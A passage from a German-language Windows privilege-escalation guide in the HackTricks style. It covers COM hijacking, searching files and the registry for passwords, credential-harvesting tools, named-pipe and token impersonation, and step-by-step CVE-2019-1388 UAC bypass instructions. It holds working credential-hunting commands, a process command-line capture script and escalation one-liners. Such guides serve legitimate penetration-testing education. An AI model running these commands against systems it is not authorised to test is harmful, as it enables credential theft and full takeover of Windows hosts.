**Component Object Model (COM)** ist eine Technologie, die im Windows-Betriebssystem integriert ist und die **Interkommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird über eine Klassen-ID (CLSID) identifiziert, und jede Komponente stellt Funktionalitäten über eine oder mehrere Schnittstellen bereit, die über Schnittstellen-IDs (IIDs) identifiziert werden.

COM-Klassen und Schnittstellen sind in der Registrierung unter **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** und **HKEY\_**_**CLASSES\_**_**ROOT\Interface** definiert. Diese Registrierung wird erstellt, indem **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** zusammengeführt werden = **HKEY\_**_**CLASSES\_**_**ROOT.**

Innerhalb der CLSIDs dieser Registrierung finden Sie die untergeordnete Registrierung **InProcServer32**, die einen **Standardwert** enthält, der auf eine **DLL** zeigt, und einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single oder Multi) oder **Neutral** (Thread Neutral) sein kann.

![](<../../.gitbook/assets/image (729).png>)

Grundsätzlich könnten Sie, wenn Sie eine der DLLs **überschreiben**, die ausgeführt werden sollen, Berechtigungen **eskaliert**, wenn diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu erfahren, wie Angreifer COM-Hijacking als Persistenzmechanismus verwenden, überprüfen Sie:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Generische Passwortsuche in Dateien und Registrierung**

**Suche nach Dateiinhalten**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Suchen Sie nach einer Datei mit einem bestimmten Dateinamen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Durchsuchen Sie die Registrierung nach Schlüsselnamen und Passwörtern**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf** Plugin, das ich erstellt habe, um automatisch jeden Metasploit POST-Modul auszuführen, der nach Anmeldeinformationen im Opfer sucht.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die auf dieser Seite erwähnte Passwörter enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool zum Extrahieren von Passwörtern aus einem System.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach Sitzungen, Benutzernamen und Passwörtern mehrerer Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Durchgesickerte Handler

Stellen Sie sich vor, dass **ein als SYSTEM ausgeführter Prozess einen neuen Prozess** (`OpenProcess()`) mit **vollen Zugriffsrechten öffnet**. Derselbe Prozess **erstellt auch einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, erbt jedoch alle offenen Handler des Hauptprozesses**.\
Dann, wenn Sie **vollen Zugriff auf den Prozess mit niedrigen Berechtigungen haben**, können Sie den **offenen Handler zum erstellten privilegierten Prozess** mit `OpenProcess()` abrufen und **einen Shellcode einschleusen**.\
[Lesen Sie dieses Beispiel für weitere Informationen darüber, **wie Sie diese Sicherheitslücke erkennen und ausnutzen können**.](leaked-handle-exploitation.md)\
[Lesen Sie diesen **weiteren Beitrag für eine ausführlichere Erklärung darüber, wie Sie mehr offene Handler von Prozessen und Threads testen und missbrauchen können, die mit unterschiedlichen Berechtigungsebenen vererbt wurden (nicht nur mit vollen Zugriffsrechten)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Benannte Pipe-Client-Imitation

Gemeinsame Speichersegmente, als **Pipes** bezeichnet, ermöglichen die Prozesskommunikation und den Datentransfer.

Windows bietet eine Funktion namens **Benannte Pipes**, die nicht zusammenhängenden Prozessen ermöglicht, Daten zu teilen, sogar über verschiedene Netzwerke hinweg. Dies ähnelt einer Client/Server-Architektur, bei der Rollen als **benannte Pipe-Server** und **benannte Pipe-Client** definiert sind.

Wenn Daten durch eine Pipe von einem **Client** gesendet werden, hat der **Server**, der die Pipe eingerichtet hat, die Möglichkeit, die Identität des **Clients** anzunehmen, vorausgesetzt er verfügt über die erforderlichen **SeImpersonate**-Rechte. Die Identifizierung eines **privilegierten Prozesses**, der über eine Pipe kommuniziert, die Sie imitieren können, bietet die Möglichkeit, durch Annahme der Identität dieses Prozesses, sobald er mit der von Ihnen eingerichteten Pipe interagiert, **höhere Berechtigungen zu erlangen**. Anleitungen zur Durchführung eines solchen Angriffs finden Sie [**hier**](named-pipe-client-impersonation.md) und [**hier**](./#from-high-integrity-to-system).

Außerdem ermöglicht das folgende Tool, **eine benannte Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool ermöglicht das Auflisten und Anzeigen aller Pipes, um Privilegien zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Sonstiges

### **Überwachung von Befehlszeilen auf Passwörter**

Wenn Sie eine Shell als Benutzer erhalten, können geplante Aufgaben oder andere ausgeführte Prozesse vorhanden sein, die **Anmeldeinformationen in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden Befehlszeilen von Prozessen und vergleicht den aktuellen Zustand mit dem vorherigen Zustand, um etwaige Unterschiede auszugeben.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Von Low-Priv-Anwender zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC-Bypass

Wenn Sie Zugriff auf die grafische Benutzeroberfläche haben (über Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess wie "NT\AUTHORITY SYSTEM" von einem nicht privilegierten Benutzer auszuführen.

Dies ermöglicht es, Berechtigungen zu eskalieren und gleichzeitig mit derselben Schwachstelle UAC zu umgehen. Darüber hinaus ist keine Installation erforderlich und die während des Prozesses verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte durchgeführt werden:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Du hast alle notwendigen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388

## Vom Administrator-Medium zum hohen Integritätslevel / UAC-Bypass

Lesen Sie dies, um mehr über Integritätslevel zu erfahren:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Dann lesen Sie dies, um mehr über UAC und UAC-Bypasses zu erfahren:

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## Vom hohen Integritätslevel zum System

### Neuer Dienst

Wenn Sie bereits in einem Prozess mit hohem Integritätslevel arbeiten, kann der Übergang zum SYSTEM einfach sein, indem Sie einfach einen neuen Dienst erstellen und ausführen:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Aus einem Prozess mit hoher Integrität könnten Sie versuchen, die **AlwaysInstallElevated-Registrierungseinträge zu aktivieren** und eine **umgekehrte Shell mithilfe eines _.msi_-Wrappers zu installieren**.\
[Mehr Informationen zu den beteiligten Registrierungsschlüsseln und wie man ein _.msi_-Paket installiert finden Sie hier.](./#alwaysinstallelevated)

### High + SeImpersonate-Berechtigung zu System

**Sie können den** [**Code hier finden**](seimpersonate-from-high-to-system.md)**.**

### Von SeDebug + SeImpersonate zu vollen Token-Berechtigungen

Wenn Sie über diese Token-Berechtigungen verfügen (wahrscheinlich finden Sie dies in einem bereits vorhandenen Prozess mit hoher Integrität), können Sie **fast jeden Prozess öffnen** (nicht geschützte Prozesse) mit der SeDebug-Berechtigung, das Token des Prozesses **kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei Verwendung dieser Technik wird normalerweise **ein Prozess ausgewählt, der als SYSTEM ausgeführt wird und alle Token-Berechtigungen hat** (_ja, Sie können SYSTEM-Prozesse ohne alle Token-Berechtigungen finden_).\
**Sie können ein** [**Beispielcode finden, der die vorgeschlagene Technik ausführt, hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Benannte Pipes**

Diese Technik wird von Meterpreter verwendet, um in `getsystem` zu eskalieren. Die Technik besteht darin, **eine Pipe zu erstellen und dann einen Dienst zu erstellen/missbrauchen, um in diese Pipe zu schreiben**. Dann wird der **Server**, der die Pipe mit der **`SeImpersonate`-Berechtigung erstellt hat, in der Lage sein, das Token** des Pipe-Clients (des Dienstes) zu **imitieren** und SYSTEM-Berechtigungen zu erhalten.\
Wenn Sie mehr über **benannte Pipes erfahren möchten, sollten Sie dies lesen**](./#named-pipe-client-impersonation).\
Wenn Sie ein Beispiel lesen möchten, [**wie man von hoher Integrität zu System mit benannten Pipes gelangt, sollten Sie dies lesen**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es Ihnen gelingt, eine DLL zu **kapern**, die von einem als **SYSTEM** ausgeführten **Prozess geladen wird**, können Sie beliebigen Code mit diesen Berechtigungen ausführen. Daher ist Dll Hijacking auch für diese Art von Privilegieneskalation nützlich und außerdem viel **einfacher von einem Prozess mit hoher Integrität aus zu erreichen**, da dieser **Schreibberechtigungen** auf den Ordnern hat, die zum Laden von DLLs verwendet werden.\
**Sie können mehr über Dll-Hijacking hier lernen**](dll-hijacking/)**.**

### **Von Administrator oder Network Service zu System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Von LOCAL SERVICE oder NETWORK SERVICE zu vollen Berechtigungen

**Lesen:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische Impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool, um nach Windows-Privilegieneskalationsvektoren zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Überprüfen Sie auf Fehlkonfigurationen und sensible Dateien (**[**hier überprüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Überprüfen Sie auf mögliche Fehlkonfigurationen und sammeln Sie Informationen (**[**hier überprüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Überprüfen Sie auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP gespeicherte Sitzungsinformationen. Verwenden Sie -Thorough lokal.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldeinformationen aus dem Anmeldeinformations-Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprühen Sie gesammelte Passwörter über die Domäne**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-ADIDNS/LLMNR/mDNS/NBNS-Spoofing- und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende Privesc-Windows-Enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Suche nach bekannten Privesc-Schwachstellen (VERALTET für Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Überprüfungen **(Benötigt Administratorrechte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Suche nach bekannten Privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriert den Host auf der Suche nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als zur Privilegieneskalation) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldeinformationen aus vielen Programmen (vorkompilierte exe auf github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Überprüfen Sie auf Fehlkonfigurationen (ausführbare Datei vorkompiliert auf github). Nicht empfohlen. Funktioniert nicht gut in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Überprüfen Sie auf mögliche Fehlkonfigurationen (exe von python). Nicht empfohlen. Funktioniert nicht gut in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool erstellt basierend auf diesem Beitrag (es benötigt keinen Zugriffschk, um ordnungsgemäß zu funktionieren, kann es aber verwenden).

**Lokal**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Sie müssen das Projekt mit der richtigen Version von .NET kompilieren ([siehe dies](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte Version von .NET auf dem Opferrechner zu sehen, können Sie dies tun:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliographie

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich den [**offiziellen PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**HackTricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**HackTricks-Cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>
